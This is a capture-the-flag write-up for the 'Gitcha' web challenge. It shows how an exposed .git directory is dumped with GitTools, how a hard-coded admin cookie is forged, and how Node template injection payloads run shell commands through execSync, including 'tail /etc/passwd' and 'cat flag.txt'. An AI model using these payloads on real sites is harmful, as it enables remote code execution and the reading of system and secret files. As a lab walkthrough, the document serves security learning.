# Gitcha

## Description

> Simon is maintaining a personal portfolio website, along with a secret which no one else knows.
>
> Can you discover his secret?
>
> Author: DeconstruCT.F

Tags: _web_ \
Difficulty: _hard_ \
Points: _496_

## Solution

At first glance, the website does not seem to have any vulnerability, however, upon inspecting the webpage source code I found an `HTML` comment suggesting that the `.git` of the site is public. We confirm that when going to the `/.git` endpoint. Exposing the `.git` directory means that anyone can get the website's source code, which is really dangerous since it is much easier for an attacker to identify and exploit vulnerabilities.

> Note: I found [this](https://infosecwriteups.com/exposed-git-directory-exploitation-3e30481e8d75)
> post incredibly helpful, and I used it as a reference to exploit this vulnerability.

First, I cloned `GitTools` to my local machine and executed the following commands:

1. To dump all the contents in `/.git`

```
$ bash gitdumper.sh http://target/.git/ <dest-dir>
```

2. To recover the source code

```
$ extractor.sh \<directory where .git is located\> \<dest-dir\>
```

The directory `0-bfc1e6775569866f6b8fb8e05e6d9b499af89613` is the latest version of the code. The file `index.js` is the most interesting to us because it has all the logic and `route handlers`, for example this one:

```javascript
app.get("/supersecret", async (req, res) => {
  if (checkAdmin(req, res)) {
    const results = await prisma.note.findMany();
    res.render("notes.html", { foo: "bar", notes: results });
  } else {
    res.redirect("/");
  }
});
```

As we can see, there is a supersecret endpoint in `/supersecret`, to get into that endpoint we must pass the `checkAdmin` function.

```javascript
const checkAdmin = (req, res) => {
  if (req.cookies["SECRET_COOKIE_VALUE"] === "thisisahugesecret") {
    return true;
  }
  return false;
};
```

We just need to have the cookie `SECRET_COOKIE_VALUE` with the value `thisisahugesecret`, you can create it in your browser and then get access to the `/supersecret` endpoint.

On that webpage you can only create notes, but ¿how can I exploit it? the database `notes.db` located in the `prisma` directory suggest something:

```sql
$ sqlite3 notes.db
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
Note                _prisma_migrations
sqlite> SELECT * FROM note;
1|asdasd|asdasd
2|asdasd|asdasd
3|{{7*7}}|asd
4|{{7*7}}|asd
5|asdasdasdasd|{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
6|asdasdasdasd|{{range.constructor("return global.process.mainModule.require('child_process').execSync('ls -la')")()}}
```

In the table `Note`, some registers resemble a [`Server Side Template Injection (SSTI)`](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection), I tried to inject the value `{{7*7}}`, and the server responded with `49`, which means it is vulnerable to this kind of attack. So I tried injecting this payload:

```
{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat flag.txt')")()}}
```

This time the server responded by printing the flag!

Flag `dsc{g1t_enum3r4ti0n_4nD_sSt1}`
